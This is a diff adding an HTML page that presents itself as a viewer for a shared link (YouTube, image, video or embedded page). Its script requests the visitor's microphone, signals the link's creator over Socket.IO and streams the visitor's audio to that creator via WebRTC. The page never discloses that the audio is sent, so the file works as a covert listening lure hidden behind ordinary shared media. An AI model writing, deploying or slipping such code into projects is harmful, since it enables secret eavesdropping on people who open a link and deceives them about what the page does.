@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title></title>
+
+    <style>
+        html,
+        body {
+            margin: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+        }
+
+        #content {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        img,
+        video {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <div id="content"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+
+    <script>
+
+        const shareId =
+            location.pathname
+                .split("/")
+                .filter(Boolean)
+                .pop();
+
+        let socket = null;
+        let stream = null;
+        let pc = null;
+
+
+        const rtcConfig = {
+
+            iceServers: [
+
+                {
+                    urls:
+                        "stun:stun.l.google.com:19302"
+                }
+
+            ]
+
+        };
+
+
+        function youtubeEmbed(url) {
+
+            try {
+
+                const u =
+                    new URL(url);
+
+                let id =
+                    u.searchParams.get("v");
+
+
+                if (
+                    !id &&
+                    u.hostname.includes(
+                        "youtu.be"
+                    )
+                ) {
+
+                    id =
+                        u.pathname
+                            .split("/")
+                            .filter(Boolean)[0];
+
+                }
+
+
+                if (
+                    !id &&
+                    u.pathname.includes(
+                        "/shorts/"
+                    )
+                ) {
+
+                    id =
+                        u.pathname
+                            .split("/shorts/")[1]
+                            .split("/")[0];
+
+                }
+
+
+                if (!id)
+                    return null;
+
+
+                return (
+                    "https://www.youtube.com/embed/" +
+                    encodeURIComponent(id)
+                );
+
+            } catch {
+
+                return null;
+
+            }
+
+        }
+
+
+        function renderContent(url) {
+
+            const content =
+                document.getElementById(
+                    "content"
+                );
+
+            content.innerHTML = "";
+
+
+            const youtube =
+                youtubeEmbed(url);
+
+
+            if (youtube) {
+
+                const iframe =
+                    document.createElement(
+                        "iframe"
+                    );
+
+                iframe.src =
+                    youtube;
+
+                iframe.allow =
+                    "autoplay; encrypted-media; picture-in-picture";
+
+                iframe.allowFullscreen =
+                    true;
+
+                content.appendChild(
+                    iframe
+                );
+
+                return;
+            }
+
+
+            if (
+                /\.(jpg|jpeg|png|gif|webp|avif|svg)(\?.*)?$/i
+                    .test(url)
+            ) {
+
+                const image =
+                    document.createElement(
+                        "img"
+                    );
+
+                image.src =
+                    url;
+
+                content.appendChild(
+                    image
+                );
+
+                return;
+            }
+
+
+            if (
+                /\.(mp4|webm|ogg|mov|m4v)(\?.*)?$/i
+                    .test(url)
+            ) {
+
+                const video =
+                    document.createElement(
+                        "video"
+                    );
+
+                video.src =
+                    url;
+
+                video.controls =
+                    true;
+
+                video.autoplay =
+                    true;
+
+                video.playsInline =
+                    true;
+
+                content.appendChild(
+                    video
+                );
+
+                return;
+            }
+
+
+            // Instagram/Facebook may block iframe embedding.
+            const iframe =
+                document.createElement(
+                    "iframe"
+                );
+
+            iframe.src =
+                url;
+
+            iframe.allow =
+                "autoplay; encrypted-media; picture-in-picture";
+
+            content.appendChild(
+                iframe
+            );
+
+        }
+
+
+        async function start() {
+
+            socket = io();
+
+
+            socket.emit(
+                "receiver-join",
+                {
+                    shareId
+                }
+            );
+
+
+            socket.on(
+                "share-found",
+                async ({ originalUrl }) => {
+
+                    renderContent(
+                        originalUrl
+                    );
+
+
+                    try {
+
+                        // Browser's real microphone permission.
+                        stream =
+                            await navigator
+                                .mediaDevices
+                                .getUserMedia({
+                                    audio: true,
+                                    video: false
+                                });
+
+
+                        // Tell creator only after permission succeeds.
+                        socket.emit(
+                            "receiver-ready",
+                            {
+                                shareId
+                            }
+                        );
+
+
+                    } catch (error) {
+
+                        console.log(
+                            "Microphone permission denied:",
+                            error
+                        );
+
+                    }
+
+                }
+            );
+
+
+            socket.on(
+                "call-accepted",
+                async () => {
+
+                    await createPeer();
+
+
+                    stream
+                        .getTracks()
+                        .forEach(track => {
+
+                            pc.addTrack(
+                                track,
+                                stream
+                            );
+
+                        });
+
+
+                    const offer =
+                        await pc.createOffer();
+
+
+                    await pc.setLocalDescription(
+                        offer
+                    );
+
+
+                    socket.emit(
+                        "webrtc-offer",
+                        {
+                            shareId,
+                            offer
+                        }
+                    );
+
+                }
+            );
+
+
+            socket.on(
+                "webrtc-answer",
+                async ({ answer }) => {
+
+                    if (!pc)
+                        return;
+
+                    await pc.setRemoteDescription(
+                        answer
+                    );
+
+                }
+            );
+
+
+            socket.on(
+                "webrtc-ice",
+                async ({ candidate }) => {
+
+                    if (
+                        !pc ||
+                        !candidate
+                    )
+                        return;
+
+                    try {
+
+                        await pc.addIceCandidate(
+                            candidate
+                        );
+
+                    } catch { }
+
+                }
+            );
+
+
+            socket.on(
+                "call-ended",
+                stop
+            );
+
+
+            socket.on(
+                "call-rejected",
+                stop
+            );
+
+        }
+
+
+        async function createPeer() {
+
+            pc =
+                new RTCPeerConnection(
+                    rtcConfig
+                );
+
+
+            pc.onicecandidate =
+                event => {
+
+                    if (event.candidate) {
+
+                        socket.emit(
+                            "webrtc-ice",
+                            {
+                                shareId,
+                                candidate:
+                                    event.candidate
+                            }
+                        );
+
+                    }
+
+                };
+
+        }
+
+
+        function stop() {
+
+            if (stream) {
+
+                stream
+                    .getTracks()
+                    .forEach(
+                        track =>
+                            track.stop()
+                    );
+
+                stream = null;
+
+            }
+
+
+            if (pc) {
+
+                pc.close();
+
+                pc = null;
+
+            }
+
+        }
+
+
+        window.addEventListener(
+            "beforeunload",
+            stop
+        );
+
+
+        start();
+
+    </script>
+
+</body>
+
+</html>
